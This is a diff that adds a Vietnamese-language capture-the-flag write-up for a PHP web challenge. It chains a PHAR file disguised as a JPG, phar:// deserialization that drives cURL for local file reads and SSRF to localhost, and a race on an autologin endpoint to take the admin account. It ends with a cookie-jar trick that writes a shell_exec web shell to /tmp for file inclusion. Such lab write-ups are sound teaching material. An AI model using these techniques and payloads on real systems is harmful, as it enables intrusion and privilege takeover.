@@ -1659,3 +1659,200 @@ sử dùng payload `<!-- --><script>document.cookie="csrf_token=x; path=/cultiva
 <img width="2558" height="1597" alt="image" src="https://github.com/user-attachments/assets/cfbc2850-1107-41ee-acb6-cccf0895cc25" />
 
 <img width="2559" height="1599" alt="image" src="https://github.com/user-attachments/assets/6210b583-d269-465c-9764-43522086c700" />
+
+## 367
+
+`report.php` cho upload file nếu MIME là `image/jpeg` hoặc `image/png`, nhưng không kiểm tra nội dung thật. Vì vậy có thể tạo PHAR rồi đổi tên thành `.jpg` để upload.
+
+Trong `delete.php`, tham số `title` được đưa thẳng vào:
+
+```php
+file_get_contents($filePath);
+```
+
+Nếu truyền:
+
+```text
+phar://./uploads/<uploaded_file>.jpg/x.jpg
+```
+
+PHP sẽ mở file upload như PHAR và deserialize metadata bên trong.
+
+Gadget chain:
+
+```text
+PendingPreview->__destruct()
+        -> PreviewState->flush()
+        -> curl_exec($endpoint)
+        -> echo output
+```
+
+Do đó ta điều khiển được `endpoint`. Với:
+
+```text
+file:///tmp/.review_rotation_cache
+```
+
+server sẽ đọc file local và in nội dung ra response.
+
+Kết quả leak được:
+
+```text
+queue=review-handoff
+principal=<base64 username>
+proof=<base64 password>
+rotation=portal
+```
+
+Decode `principal` và `proof` để lấy tài khoản seed.
+
+`autologin.php` tìm record bằng:
+
+```sql
+meta_value LIKE '%"vault_key"%'
+```
+
+Nhưng khi dùng `vault_key=status`, chuỗi `"status"` tồn tại trong mọi serialized autologin record active.
+
+Bug race nằm ở action `create_by_username`:
+
+```text
+1. User thường gọi create_by_username với username=admin.
+2. Server tạo record autologin cho admin.
+3. Vì admin không phải user hiện tại, server xóa record đó ngay sau.
+```
+
+Nếu spam song song:
+
+```text
+POST /autologin.php
+action=create_by_username&username=admin
+```
+
+và:
+
+```text
+GET /autologin.php?vault_key=status
+```
+
+thì GET có thể bắt đúng thời điểm chỉ có 1 record của admin trong `user_meta`.
+
+Khi đó app login thành `admin`, vì quyền admin được set bằng username:
+
+```php
+$_SESSION['admin'] = ($user['username'] === 'admin');
+```
+
+Trước khi race nên revoke autologin record của attacker và seed user để giảm số record match `status`.
+
+Khi đã có session admin, gọi:
+
+```text
+GET /dashboard.php
+```
+
+Response có header:
+
+```text
+X-Archive-Receipt: <base64url>
+```
+
+Decode base64url sẽ ra access code dạng:
+
+```text
+ARCHIVE-xxxxxxxxxxxxxxxx
+```
+
+Đây là code cần POST vào `/admin.php`.
+
+`admin.php` chỉ cấp superadmin nếu:
+
+```php
+md5($_POST['access_code']) === md5($document_content)
+&& $_SERVER['REMOTE_ADDR'] === '127.0.0.1'
+```
+
+Ta dùng lại PHAR gadget, nhưng lần này endpoint là:
+
+```text
+http://127.0.0.1/admin.php
+```
+
+Payload POST:
+
+```text
+access_code=<decoded access code>
+```
+
+Cookie:
+
+```text
+PHPSESSID=<admin session>
+```
+
+Vì request được server tự curl tới localhost nên bypass được check `127.0.0.1`. Nếu đúng, response có:
+
+```text
+Administrator privileges have been granted.
+```
+
+Lúc này session admin đã thành superadmin.
+
+`dashboard.php` cho superadmin include file trong `/tmp`:
+
+```php
+$filename = strtolower(trim($_POST['filename']));
+include($filename);
+```
+
+Cách upload `temp_copy=1` bị lỗi vì `report.php` sinh filename luôn có 1 chữ hoa, còn `dashboard.php` lowercase path nên `file_exists()` fail.
+
+Bypass bằng `CURLOPT_COOKIEJAR`.
+
+Khi đã là superadmin, `__wakeup()` không phá `$headers`, nên ta điều khiển được một cURL option:
+
+```php
+[CURLOPT_COOKIEJAR => "/tmp/p.php"]
+```
+
+Tạo PHAR để server curl tới server của mình. Server của mình trả:
+
+```http
+Set-Cookie: x=<?=shell_exec(chr(47)."readf"."lag")?>
+```
+
+Do `CURLOPT_COOKIEJAR=/tmp/p.php`, libcurl ghi cookie vào `/tmp/p.php`.
+
+Sau đó gọi:
+
+```text
+POST /dashboard.php
+filename=/tmp/p.php
+```
+
+`dashboard.php` include `/tmp/p.php`, PHP payload chạy `/readflag` và in flag.
+
+```text
+Register/Login user thường
+        ↓
+Upload PHAR giả JPG qua report.php
+        ↓
+Trigger delete.php bằng phar://
+        ↓
+File-read /tmp/.review_rotation_cache
+        ↓
+Decode seed account
+        ↓
+Autologin race với vault_key=status để lấy admin
+        ↓
+Admin đọc X-Archive-Receipt từ dashboard.php
+        ↓
+PHAR SSRF tới 127.0.0.1/admin.php để lên superadmin
+        ↓
+PHAR CookieJar ghi payload vào /tmp/p.php
+        ↓
+dashboard.php include /tmp/p.php
+        ↓
+/readflag
+```
+
